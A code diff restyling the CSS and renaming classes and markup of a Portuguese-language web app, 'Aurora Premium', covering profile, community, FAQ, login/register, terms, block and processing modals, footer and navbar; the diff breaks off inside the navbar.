         .profile-avatar {
-            width: 100px;
-            height: 100px;
+            width: 96px;
+            height: 96px;
             border-radius: 50%;
-            background: var(--gradient-main);
+            background: var(--gradient);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 3rem;
+            font-size: 2.8rem;
             font-weight: 700;
             color: white;
             margin: 0 auto 1rem;
-            border: 3px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 0 60px rgba(108, 43, 217, 0.15);
+            border: 3px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 0 60px rgba(108, 59, 247, 0.1);
         }
 
         .profile-box h3 {
-            font-size: 1.5rem;
-            font-weight: 800;
+            font-size: 1.4rem;
+            font-weight: 700;
             color: var(--text-primary);
+            font-family: 'Space Grotesk', sans-serif;
         }
 
-        .profile-box .profile-email {
+        .profile-box .email {
             color: var(--text-secondary);
             font-size: 0.85rem;
         }
 
-        .profile-box .profile-date {
+        .profile-box .since {
             color: var(--text-muted);
             font-size: 0.75rem;
         }
@@ -1040,55 +1015,47 @@
         }
 
         .profile-stat {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid var(--glass-border);
-            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
             padding: 0.8rem;
         }
 
-        .profile-stat .number {
-            font-family: 'Orbitron', monospace;
+        .profile-stat .num {
+            font-family: 'Space Grotesk', sans-serif;
             font-size: 1.3rem;
             font-weight: 700;
-            color: var(--secondary);
+            color: var(--accent-3);
             display: block;
         }
 
         .profile-stat .label {
             font-size: 0.65rem;
             color: var(--text-muted);
-            font-weight: 600;
+            font-weight: 500;
         }
 
-        /* ===== COMUNIDADE ===== */
+        /* ===== COMMUNITY ===== */
         .community-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
             gap: 1.5rem;
-            margin-top: 2rem;
         }
 
         .community-card {
-            background: var(--glass);
-            border: 1px solid var(--glass-border);
-            border-radius: 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 2rem;
             text-align: center;
             transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-            animation: fadeInUp 0.6s ease-out forwards;
-            opacity: 0;
             cursor: pointer;
         }
 
         .community-card:hover {
-            transform: translateY(-8px);
-            border-color: rgba(108, 43, 217, 0.3);
-            box-shadow: 0 20px 60px rgba(108, 43, 217, 0.1);
+            transform: translateY(-6px);
+            border-color: rgba(108, 59, 247, 0.2);
         }
-
-        .community-card:nth-child(1) { animation-delay: 0.1s; }
-        .community-card:nth-child(2) { animation-delay: 0.15s; }
-        .community-card:nth-child(3) { animation-delay: 0.2s; }
 
         .community-icon {
             width: 64px;
@@ -1103,16 +1070,16 @@
         }
 
         .community-card:hover .community-icon {
-            transform: scale(1.1) rotate(10deg);
+            transform: scale(1.05);
         }
 
         .community-icon.discord { background: linear-gradient(135deg, #5865F2, #4752C4); color: white; }
-        .community-icon.email { background: linear-gradient(135deg, #7c3aed, #5b21b6); color: white; }
+        .community-icon.email { background: linear-gradient(135deg, var(--accent-1), var(--accent-2)); color: white; }
         .community-icon.tiktok { background: linear-gradient(135deg, #000000, #1a1a1a); color: #25f4ee; border: 2px solid #25f4ee; }
 
         .community-card h3 {
             font-size: 1rem;
-            font-weight: 800;
+            font-weight: 700;
             color: var(--text-primary);
         }
 
@@ -1124,12 +1091,12 @@
         }
 
         .community-btn {
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.03);
             color: var(--text-secondary);
-            border: 1px solid var(--glass-border);
-            border-radius: 10px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
             padding: 0.5rem 1.5rem;
-            font-weight: 700;
+            font-weight: 600;
             font-size: 0.8rem;
             cursor: pointer;
             transition: all 0.3s ease;
@@ -1138,15 +1105,15 @@
         }
 
         .community-card:hover .community-btn {
-            background: rgba(108, 43, 217, 0.15);
-            border-color: rgba(108, 43, 217, 0.3);
-            color: var(--secondary);
+            background: rgba(108, 59, 247, 0.08);
+            border-color: rgba(108, 59, 247, 0.2);
+            color: var(--accent-3);
         }
 
         .email-box {
-            background: rgba(108, 43, 217, 0.06);
-            border: 1px solid rgba(108, 43, 217, 0.1);
-            border-radius: 10px;
+            background: rgba(108, 59, 247, 0.04);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
             padding: 0.5rem;
             margin-bottom: 0.8rem;
         }
@@ -1162,7 +1129,7 @@
         }
 
         .email-box i {
-            color: var(--secondary);
+            color: var(--accent-3);
         }
 
         /* ===== FAQ ===== */
@@ -1170,31 +1137,21 @@
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
             gap: 0.8rem;
-            margin-top: 2rem;
         }
 
         .faq-item {
-            background: var(--glass);
-            border: 1px solid var(--glass-border);
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
             border-radius: 12px;
             overflow: hidden;
             transition: all 0.3s ease;
-            animation: fadeInUp 0.6s ease-out forwards;
-            opacity: 0;
         }
 
         .faq-item:hover {
-            border-color: rgba(108, 43, 217, 0.2);
+            border-color: rgba(108, 59, 247, 0.15);
         }
 
-        .faq-item:nth-child(1) { animation-delay: 0.05s; }
-        .faq-item:nth-child(2) { animation-delay: 0.1s; }
-        .faq-item:nth-child(3) { animation-delay: 0.15s; }
-        .faq-item:nth-child(4) { animation-delay: 0.2s; }
-        .faq-item:nth-child(5) { animation-delay: 0.25s; }
-        .faq-item:nth-child(6) { animation-delay: 0.3s; }
-
-        .faq-question {
+        .faq-q {
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -1203,38 +1160,38 @@
             transition: all 0.3s ease;
         }
 
-        .faq-question:hover {
-            background: rgba(255, 255, 255, 0.03);
+        .faq-q:hover {
+            background: rgba(255, 255, 255, 0.02);
         }
 
-        .faq-question h3 {
+        .faq-q h3 {
             font-size: 0.85rem;
-            font-weight: 700;
+            font-weight: 600;
             color: var(--text-primary);
             margin: 0;
         }
 
-        .faq-question i {
-            color: var(--secondary);
+        .faq-q i {
+            color: var(--accent-3);
             transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
             font-size: 0.8rem;
         }
 
-        .faq-item.open .faq-question i {
+        .faq-item.open .faq-q i {
             transform: rotate(180deg);
         }
 
-        .faq-answer {
+        .faq-a {
             max-height: 0;
             overflow: hidden;
             transition: max-height 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
-        .faq-item.open .faq-answer {
+        .faq-item.open .faq-a {
             max-height: 200px;
         }
 
-        .faq-answer p {
+        .faq-a p {
             padding: 0 1.2rem 1.2rem;
             color: var(--text-secondary);
             font-size: 0.8rem;
@@ -1247,8 +1204,8 @@
             position: fixed;
             inset: 0;
             background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
             display: none;
             align-items: center;
             justify-content: center;
@@ -1258,22 +1215,22 @@
 
         .auth-overlay.active {
             display: flex;
-            animation: fadeInUp 0.4s ease-out;
+            animation: fadeUp 0.4s ease-out;
         }
 
         .auth-modal {
-            background: linear-gradient(145deg, rgba(10, 10, 15, 0.98), rgba(5, 5, 8, 0.98));
-            border: 1px solid var(--glass-border);
-            border-radius: 20px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 2rem;
             max-width: 400px;
             width: 100%;
-            animation: scaleIn 0.4s ease-out;
+            animation: fadeScale 0.4s ease-out;
             max-height: 90vh;
             overflow-y: auto;
         }
 
-        .auth-modal .close-btn {
+        .auth-modal .close {
             float: right;
             background: none;
             border: none;
@@ -1283,24 +1240,24 @@
             transition: all 0.3s ease;
         }
 
-        .auth-modal .close-btn:hover {
+        .auth-modal .close:hover {
             color: #ef4444;
             transform: rotate(90deg);
         }
 
         .auth-modal h2 {
-            font-family: 'Orbitron', monospace;
+            font-family: 'Space Grotesk', sans-serif;
             font-size: 1.4rem;
             font-weight: 700;
             text-align: center;
             margin-bottom: 0.3rem;
-            background: var(--gradient-main);
+            background: var(--gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
 
-        .auth-modal .auth-sub {
+        .auth-modal .sub {
             text-align: center;
             color: var(--text-secondary);
             font-size: 0.85rem;
@@ -1311,21 +1268,21 @@
             width: 100%;
             padding: 0.8rem;
             border: none;
-            border-radius: 12px;
-            font-weight: 700;
+            border-radius: 10px;
+            font-weight: 600;
             font-size: 0.9rem;
             cursor: pointer;
             transition: all 0.3s ease;
             margin-top: 0.3rem;
             font-family: 'Inter', sans-serif;
-            background: var(--gradient-main);
+            background: var(--gradient);
             color: white;
-            box-shadow: 0 10px 30px rgba(108, 43, 217, 0.3);
+            box-shadow: 0 10px 30px rgba(108, 59, 247, 0.2);
         }
 
         .auth-modal .btn-auth:hover {
             transform: translateY(-2px);
-            box-shadow: 0 15px 40px rgba(108, 43, 217, 0.5);
+            box-shadow: 0 15px 40px rgba(108, 59, 247, 0.35);
         }
 
         .auth-modal .btn-auth:disabled {
@@ -1334,30 +1291,30 @@
             transform: none;
         }
 
-        .auth-modal .switch-auth {
+        .auth-modal .switch {
             text-align: center;
             margin-top: 0.8rem;
             color: var(--text-muted);
             font-size: 0.8rem;
         }
 
-        .auth-modal .switch-auth button {
+        .auth-modal .switch button {
             background: none;
             border: none;
-            color: var(--secondary);
-            font-weight: 700;
+            color: var(--accent-3);
+            font-weight: 600;
             cursor: pointer;
             font-size: 0.8rem;
             font-family: 'Inter', sans-serif;
         }
 
-        .auth-modal .switch-auth button:hover {
-            color: var(--primary-light);
+        .auth-modal .switch button:hover {
+            color: var(--accent-2);
         }
 
-        .auth-modal .auth-error {
-            background: rgba(239, 68, 68, 0.08);
-            border: 1px solid rgba(239, 68, 68, 0.15);
+        .auth-modal .err {
+            background: rgba(239, 68, 68, 0.06);
+            border: 1px solid rgba(239, 68, 68, 0.1);
             border-radius: 10px;
             padding: 0.5rem;
             color: #fca5a5;
@@ -1367,26 +1324,26 @@
             display: none;
         }
 
-        .auth-modal .auth-error.visible {
+        .auth-modal .err.visible {
             display: block;
-            animation: fadeInUp 0.3s ease-out;
+            animation: fadeUp 0.3s ease-out;
         }
 
-        .auth-modal.register-mode .register-badge {
+        .auth-modal.register .reg-badge {
             display: inline-block;
-            background: rgba(108, 43, 217, 0.15);
-            border: 1px solid rgba(108, 43, 217, 0.2);
+            background: rgba(108, 59, 247, 0.1);
+            border: 1px solid rgba(108, 59, 247, 0.1);
             padding: 0.1rem 0.8rem;
-            border-radius: 50px;
+            border-radius: 100px;
             font-size: 0.55rem;
             font-weight: 700;
-            color: var(--secondary);
+            color: var(--accent-3);
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
             margin-bottom: 0.3rem;
         }
 
-        .auth-modal.register-mode .register-features {
+        .auth-modal.register .reg-features {
             display: flex;
             flex-wrap: wrap;
             gap: 0.3rem;
@@ -1394,21 +1351,21 @@
             margin: 0.8rem 0 0.3rem;
         }
 
-        .auth-modal.register-mode .register-features span {
+        .auth-modal.register .reg-features span {
             display: inline-flex;
             align-items: center;
             gap: 0.2rem;
-            background: rgba(108, 43, 217, 0.06);
-            border: 1px solid var(--glass-border);
-            padding: 0.15rem 0.6rem;
-            border-radius: 50px;
+            background: rgba(108, 59, 247, 0.04);
+            border: 1px solid var(--border-color);
+            padding: 0.1rem 0.6rem;
+            border-radius: 100px;
             font-size: 0.6rem;
             color: var(--text-secondary);
-            font-weight: 600;
+            font-weight: 500;
         }
 
-        .auth-modal.register-mode .register-features span i {
-            color: var(--secondary);
+        .auth-modal.register .reg-features span i {
+            color: var(--accent-3);
             font-size: 0.5rem;
         }
 
@@ -1417,8 +1374,8 @@
             position: fixed;
             inset: 0;
             background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             display: none;
             align-items: center;
             justify-content: center;
@@ -1428,22 +1385,22 @@
 
         .terms-overlay.active {
             display: flex;
-            animation: fadeInUp 0.4s ease-out;
+            animation: fadeUp 0.4s ease-out;
         }
 
         .terms-box {
-            background: linear-gradient(145deg, rgba(10, 10, 15, 0.98), rgba(5, 5, 8, 0.98));
-            border: 1px solid var(--glass-border);
-            border-radius: 20px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 2rem;
             max-width: 600px;
             width: 100%;
             max-height: 80vh;
             overflow-y: auto;
-            animation: scaleIn 0.4s ease-out;
+            animation: fadeScale 0.4s ease-out;
         }
 
-        .terms-box .close-btn {
+        .terms-box .close {
             float: right;
             background: none;
             border: none;
@@ -1453,13 +1410,13 @@
             transition: all 0.3s ease;
         }
 
-        .terms-box .close-btn:hover {
+        .terms-box .close:hover {
             color: #ef4444;
             transform: rotate(90deg);
         }
 
         .terms-box h2 {
-            font-family: 'Orbitron', monospace;
+            font-family: 'Space Grotesk', sans-serif;
             font-size: 1.2rem;
             font-weight: 700;
             text-align: center;
@@ -1468,7 +1425,7 @@
         }
 
         .terms-box h3 {
-            color: var(--secondary);
+            color: var(--accent-3);
             font-size: 0.95rem;
             font-weight: 700;
             margin: 0.8rem 0 0.3rem;
@@ -1507,8 +1464,8 @@
             position: fixed;
             inset: 0;
             background: rgba(0, 0, 0, 0.92);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
             display: none;
             align-items: center;
             justify-content: center;
@@ -1518,18 +1475,18 @@
 
         .block-overlay.active {
             display: flex;
-            animation: fadeInUp 0.5s ease-out;
+            animation: fadeUp 0.5s ease-out;
         }
 
         .block-box {
-            background: linear-gradient(145deg, rgba(10, 10, 15, 0.98), rgba(5, 5, 8, 0.98));
-            border: 2px solid rgba(239, 68, 68, 0.2);
-            border-radius: 20px;
+            background: var(--bg-secondary);
+            border: 2px solid rgba(239, 68, 68, 0.15);
+            border-radius: var(--radius);
             padding: 2rem;
             max-width: 440px;
             width: 100%;
             text-align: center;
-            animation: scaleIn 0.4s ease-out;
+            animation: fadeScale 0.4s ease-out;
         }
 
         .block-gif {
@@ -1538,27 +1495,17 @@
             margin: 0 auto 0.8rem;
             border-radius: 12px;
             overflow: hidden;
-            border: 2px solid rgba(239, 68, 68, 0.15);
+            border: 2px solid rgba(239, 68, 68, 0.1);
             display: none;
         }
 
-        .block-gif.active {
-            display: block;
-        }
+        .block-gif.active { display: block; }
+        .block-gif img { width: 100%; height: auto; display: block; }
 
-        .block-gif img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-
-        .block-icon {
-            font-size: 3rem;
-            margin-bottom: 0.3rem;
-        }
+        .block-icon { font-size: 3rem; margin-bottom: 0.3rem; }
 
         .block-box h2 {
-            font-family: 'Orbitron', monospace;
+            font-family: 'Space Grotesk', sans-serif;
             font-size: 1.3rem;
             font-weight: 700;
             margin-bottom: 0.3rem;
@@ -1572,11 +1519,11 @@
         }
 
         .block-reason {
-            background: rgba(239, 68, 68, 0.06);
+            background: rgba(239, 68, 68, 0.04);
             border-radius: 10px;
             padding: 0.6rem;
             margin-bottom: 0.8rem;
-            border: 1px solid rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.06);
         }
 
         .block-reason p {
@@ -1586,7 +1533,7 @@
             margin: 0;
         }
 
-        .block-box .block-desc {
+        .block-desc {
             color: var(--text-secondary);
             font-size: 0.85rem;
             line-height: 1.7;
@@ -1609,7 +1556,7 @@
 
         .btn-retry:hover {
             transform: translateY(-3px);
-            box-shadow: 0 10px 30px rgba(239, 68, 68, 0.3);
+            box-shadow: 0 10px 30px rgba(239, 68, 68, 0.2);
         }
 
         .btn-retry.ban {
@@ -1620,13 +1567,13 @@
             background: linear-gradient(135deg, #f59e0b, #d97706);
         }
 
-        /* ===== PROCESSING ===== */
+        /* ===== PROCESSING / SUCCESS ===== */
         .modal-overlay {
             position: fixed;
             inset: 0;
             background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
             display: none;
             align-items: center;
             justify-content: center;
@@ -1636,32 +1583,32 @@
 
         .modal-overlay.active {
             display: flex;
-            animation: fadeInUp 0.4s ease-out;
+            animation: fadeUp 0.4s ease-out;
         }
 
         .modal-box {
-            background: linear-gradient(145deg, rgba(10, 10, 15, 0.98), rgba(5, 5, 8, 0.98));
-            border: 1px solid var(--glass-border);
-            border-radius: 20px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 2rem;
             max-width: 380px;
             width: 100%;
             text-align: center;
-            animation: scaleIn 0.4s ease-out;
+            animation: fadeScale 0.4s ease-out;
         }
 
         .loader {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(108, 43, 217, 0.15);
-            border-top: 3px solid var(--secondary);
+            width: 48px;
+            height: 48px;
+            border: 3px solid rgba(108, 59, 247, 0.1);
+            border-top: 3px solid var(--accent-3);
             border-radius: 50%;
             margin: 0 auto 0.8rem;
             animation: spin 1s linear infinite;
         }
 
         .modal-box h2 {
-            font-family: 'Orbitron', monospace;
+            font-family: 'Space Grotesk', sans-serif;
             font-size: 1.1rem;
             font-weight: 700;
             color: var(--text-primary);
@@ -1676,14 +1623,14 @@
         .progress-bar {
             width: 100%;
             height: 4px;
-            background: rgba(255, 255, 255, 0.05);
+            background: var(--border-color);
             border-radius: 10px;
             overflow: hidden;
         }
 
         .progress-fill {
             height: 100%;
-            background: var(--gradient-main);
+            background: var(--gradient);
             border-radius: 10px;
             animation: progressFill 3s ease-out forwards;
             width: 0%;
@@ -1697,55 +1644,29 @@
         .progress-text {
             color: var(--text-muted);
             font-size: 0.7rem;
-            font-weight: 600;
+            font-weight: 500;
             display: block;
             margin-top: 0.3rem;
         }
 
-        /* ===== SUCCESS ===== */
-        .success-box {
-            background: linear-gradient(145deg, rgba(10, 10, 15, 0.98), rgba(5, 5, 8, 0.98));
-            border: 1px solid var(--glass-border);
-            border-radius: 20px;
-            padding: 2rem;
-            max-width: 380px;
-            width: 100%;
-            text-align: center;
-            animation: scaleIn 0.4s ease-out;
-        }
-
         .success-icon {
-            width: 60px;
-            height: 60px;
-            background: rgba(34, 197, 94, 0.1);
-            border: 2px solid rgba(34, 197, 94, 0.2);
+            width: 56px;
+            height: 56px;
+            background: rgba(34, 197, 94, 0.08);
+            border: 2px solid rgba(34, 197, 94, 0.12);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 0.8rem;
-            font-size: 1.8rem;
+            font-size: 1.6rem;
             color: #22c55e;
-            animation: scaleIn 0.6s ease-out;
-        }
-
-        .success-box h2 {
-            font-family: 'Orbitron', monospace;
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: var(--text-primary);
-        }
-
-        .success-box p {
-            color: var(--text-secondary);
-            font-size: 0.85rem;
-            margin-bottom: 1.2rem;
-            line-height: 1.6;
+            animation: fadeScale 0.6s ease-out;
         }
 
         /* ===== FOOTER ===== */
         .footer {
-            border-top: 1px solid var(--glass-border);
+            border-top: 1px solid var(--border-color);
             padding: 2.5rem 0 1.5rem;
             margin-top: 3rem;
             position: relative;
@@ -1761,7 +1682,7 @@
 
         .footer-col h4 {
             font-size: 0.85rem;
-            font-weight: 800;
+            font-weight: 700;
             color: var(--text-primary);
             margin-bottom: 0.5rem;
         }
@@ -1777,7 +1698,7 @@
         }
 
         .footer-col a:hover {
-            color: var(--secondary);
+            color: var(--accent-3);
             padding-left: 0.3rem;
         }
 
@@ -1788,25 +1709,23 @@
         .footer-bottom {
             text-align: center;
             padding-top: 1.5rem;
-            border-top: 1px solid var(--glass-border);
+            border-top: 1px solid var(--border-color);
             color: var(--text-muted);
             font-size: 0.7rem;
         }
 
         .footer-bottom i {
-            color: var(--secondary);
+            color: var(--accent-3);
         }
 
         .footer-bottom .aurora {
-            color: var(--secondary);
+            color: var(--accent-3);
             font-weight: 700;
         }
 
         /* ===== RESPONSIVO ===== */
         @media (max-width: 1024px) {
-            .dash-grid {
-                grid-template-columns: 1fr;
-            }
+            .dash-grid { grid-template-columns: 1fr; }
         }
 
         @media (max-width: 768px) {
@@ -1817,137 +1736,53 @@
                 top: 100%;
                 left: 0;
                 right: 0;
-                background: rgba(5, 5, 8, 0.98);
-                backdrop-filter: blur(20px);
+                background: var(--bg-secondary);
                 padding: 1rem 1.5rem;
                 gap: 0.2rem;
-                border-bottom: 1px solid var(--glass-border);
+                border-bottom: 1px solid var(--border-color);
                 box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
             }
 
-            .nav-links.open {
-                display: flex;
-            }
+            .nav-links.open { display: flex; }
+            .nav-link { padding: 0.6rem 0.5rem; width: 100%; font-size: 0.85rem; }
+            .nav-toggle { display: block; }
 
-            .nav-link {
-                padding: 0.6rem 0.5rem;
-                width: 100%;
-                font-size: 0.85rem;
-            }
+            .section { padding: 5rem 0 2rem; min-height: auto; }
+            .hero { min-height: 80vh; }
 
-            .nav-toggle {
-                display: block;
-            }
+            .recovery-box { padding: 1.5rem; }
+            .profile-box { padding: 1.5rem; }
+            .auth-modal { padding: 1.5rem; }
+            .terms-box { padding: 1.5rem; }
+            .block-box { padding: 1.5rem; }
 
-            .section {
-                padding: 5rem 0 2rem;
-                min-height: auto;
-            }
-
-            .hero {
-                min-height: 80vh;
-            }
-
-            .recovery-box {
-                padding: 1.5rem;
-            }
-
-            .profile-box {
-                padding: 1.5rem;
-            }
-
-            .auth-modal {
-                padding: 1.5rem;
-            }
-
-            .terms-box {
-                padding: 1.5rem;
-            }
-
-            .block-box {
-                padding: 1.5rem;
-            }
-
-            .dash-stats {
-                grid-template-columns: 1fr 1fr;
-                gap: 0.8rem;
-            }
-
-            .features-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-
-            .faq-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .community-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .footer-grid {
-                grid-template-columns: 1fr 1fr;
-                gap: 1.5rem;
-            }
+            .dash-stats { grid-template-columns: 1fr 1fr; gap: 0.8rem; }
+            .features-grid { grid-template-columns: 1fr 1fr; }
+            .faq-grid { grid-template-columns: 1fr; }
+            .community-grid { grid-template-columns: 1fr; }
+            .footer-grid { grid-template-columns: 1fr 1fr; gap: 1.5rem; }
         }
 
         @media (max-width: 480px) {
-            .hero-title {
-                font-size: 2.5rem;
-            }
-            .section-title {
-                font-size: 1.5rem;
-            }
-            .dash-stats {
-                grid-template-columns: 1fr;
-            }
-            .features-grid {
-                grid-template-columns: 1fr;
-            }
-            .footer-grid {
-                grid-template-columns: 1fr;
-            }
-            .recovery-box {
-                padding: 1rem;
-            }
-            .auth-modal {
-                padding: 1rem;
-            }
-            .block-box {
-                padding: 1rem;
-            }
-            .block-gif {
-                max-width: 140px;
-            }
-            .profile-avatar {
-                width: 70px;
-                height: 70px;
-                font-size: 2rem;
-            }
+            .hero-title { font-size: 2.5rem; }
+            .section-header h2 { font-size: 1.5rem; }
+            .dash-stats { grid-template-columns: 1fr; }
+            .features-grid { grid-template-columns: 1fr; }
+            .footer-grid { grid-template-columns: 1fr; }
+            .recovery-box { padding: 1rem; }
+            .auth-modal { padding: 1rem; }
+            .profile-avatar { width: 70px; height: 70px; font-size: 2rem; }
+            .block-gif { max-width: 140px; }
         }
     </style>
 </head>
 <body>
-    <!-- ===== FUNDO ===== -->
-    <div class="hero-bg">
-        <div class="grid-lines"></div>
-        <div class="neon-glow g1"></div>
-        <div class="neon-glow g2"></div>
-        <div class="neon-glow g3"></div>
-        <div class="particles">
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-        </div>
+    <!-- ===== BACKGROUND ===== -->
+    <div class="bg-canvas">
+        <div class="grid"></div>
+        <div class="orb o1"></div>
+        <div class="orb o2"></div>
+        <div class="orb o3"></div>
     </div>
 
     <!-- ===== BLOCK OVERLAY ===== -->
@@ -1971,10 +1806,10 @@
     <!-- ===== TERMS OVERLAY ===== -->
     <div class="terms-overlay" id="termsOverlay">
         <div class="terms-box">
-            <button class="close-btn" onclick="closeTerms()">
+            <button class="close" onclick="closeTerms()">
                 <i class="fas fa-times"></i>
             </button>
-            <h2>✨ Termos de Serviço</h2>
+            <h2>Termos de Serviço</h2>
             <h3>1. Termos de Serviço</h3>
             <p>Ao utilizar a plataforma Aurora Premium, você concorda com os seguintes termos:</p>
             <ul>
@@ -1990,7 +1825,7 @@
                 <li><strong>2.3</strong> Não armazenamos seus dados permanentemente em nossos servidores.</li>
             </ul>
             <div class="terms-actions">
-                <button class="btn btn-secondary" onclick="closeTerms()">❌ Recusar</button>
+                <button class="btn btn-outline" onclick="closeTerms()">❌ Recusar</button>
                 <button class="btn btn-primary" onclick="acceptTerms()">✅ Aceito e Concordo</button>
             </div>
         </div>
@@ -1999,54 +1834,54 @@
     <!-- ===== AUTH OVERLAY ===== -->
     <div class="auth-overlay" id="authOverlay">
         <div class="auth-modal" id="authModal">
-            <button class="close-btn" onclick="closeAuth()">
+            <button class="close" onclick="closeAuth()">
                 <i class="fas fa-times"></i>
             </button>
             
             <!-- Login -->
             <div id="loginMode">
                 <h2>Bem-vindo de volta</h2>
-                <p class="auth-sub">Entre para acessar o sistema</p>
-                <div class="auth-error" id="authError"></div>
+                <p class="sub">Entre para acessar o sistema</p>
+                <div class="err" id="authError"></div>
                 <form id="authForm" onsubmit="handleAuth(event)">
                     <div class="form-group">
                         <label><i class="fas fa-envelope"></i> Email</label>
-                        <input type="email" id="authEmail" class="form-input" placeholder="seu@email.com" required>
+                        <input type="email" id="authEmail" class="input-field" placeholder="seu@email.com" required>
                     </div>
                     <div class="form-group">
                         <label><i class="fas fa-lock"></i> Senha</label>
-                        <input type="password" id="authPassword" class="form-input" placeholder="••••••••" required minlength="6">
+                        <input type="password" id="authPassword" class="input-field" placeholder="••••••••" required minlength="6">
                     </div>
                     <button type="submit" class="btn-auth" id="authSubmitBtn">
                         <i class="fas fa-arrow-right"></i> Entrar
                     </button>
                 </form>
-                <div class="switch-auth">
+                <div class="switch">
                     <span>Não tem conta?</span>
-                    <button onclick="openAuth('register')">Crie uma agora ✨</button>
+                    <button onclick="openAuth('register')">Crie uma agora ✦</button>
                 </div>
             </div>
             
             <!-- Register -->
             <div id="registerMode" style="display:none;">
-                <div class="register-badge">✨ NOVA CONTA</div>
+                <div class="reg-badge">✦ NOVA CONTA</div>
                 <h2>Crie sua conta</h2>
-                <p class="auth-sub">Junte-se à família Aurora</p>
-                <div class="auth-error" id="registerError"></div>
+                <p class="sub">Junte-se à família Aurora</p>
+                <div class="err" id="registerError"></div>
                 <form id="registerForm" onsubmit="handleAuth(event)">
                     <div class="form-group">
                         <label><i class="fas fa-user"></i> Nome de usuário</label>
-                        <input type="text" id="authUsername" class="form-input" placeholder="Escolha um nome único" minlength="3" required>
+                        <input type="text" id="authUsername" class="input-field" placeholder="Escolha um nome único" minlength="3" required>
                     </div>
                     <div class="form-group">
                         <label><i class="fas fa-envelope"></i> Email</label>
-                        <input type="email" id="registerEmail" class="form-input" placeholder="seu@email.com" required>
+                        <input type="email" id="registerEmail" class="input-field" placeholder="seu@email.com" required>
                     </div>
                     <div class="form-group">
                         <label><i class="fas fa-lock"></i> Senha</label>
-                        <input type="password" id="registerPassword" class="form-input" placeholder="Mínimo 6 caracteres" required minlength="6">
+                        <input type="password" id="registerPassword" class="input-field" placeholder="Mínimo 6 caracteres" required minlength="6">
                     </div>
-                    <div class="register-features">
+                    <div class="reg-features">
                         <span><i class="fas fa-check"></i> Grátis</span>
                         <span><i class="fas fa-check"></i> Seguro</span>
                         <span><i class="fas fa-check"></i> Rápido</span>
@@ -2056,7 +1891,7 @@
                         <i class="fas fa-user-plus"></i> Criar Conta
                     </button>
                 </form>
-                <div class="switch-auth">
+                <div class="switch">
                     <span>Já tem conta?</span>
                     <button onclick="openAuth('login')">Faça login</button>
                 </div>
@@ -2066,35 +1901,35 @@
 
     <!-- ===== NAVBAR ===== -->
     <nav class="navbar" id="navbar">
-        <div class="nav-container">
-            <div class="nav-logo" onclick="showSection('home')">
-                <div class="logo-icon">✦</div>
-                <span>AURORA</span>
+        <div class="nav-inner">
+            <div class="nav-brand" onclick="showSection('home')">
+                <div class="brand-icon">✦</div>
+                <span class="brand-text">AURORA</span>
             </div>
             <div class="nav-links" id="navLinks">
-                <button class="nav-link active" onclick="showSection('home')"><i class="fas fa-home"></i> Home</button>
+                <button class="nav-link active" onclick="showSection('home')"><i class="fas fa-home"></i> Início</button>
                 <button class="nav-link" onclick="showSection('features')"><i class="fas fa-rocket"></i> Recursos</button>
-                <button class="nav-link" onclick="showSection('dashboard')"><i class="fas fa-chart-pie"></i> Dashboard</button>
+                <button class="nav-link" onclick="showSection('dashboard')"><i class="fas fa-chart-pie"></i> Painel</button>
                 <button class="nav-link" onclick="showSection('recovery')"><i class="fas fa-sync-alt"></i> Recuperar</button>
                 <button class="nav-link" onclick="showSection('community')"><i class="fas fa-users"></i> Comunidade</button>
                 <button class="nav-link" onclick="showSection('faq')"><i class="fas fa-question-circle"></i> FAQ</button>
             </div>
-            <div class="nav-user">
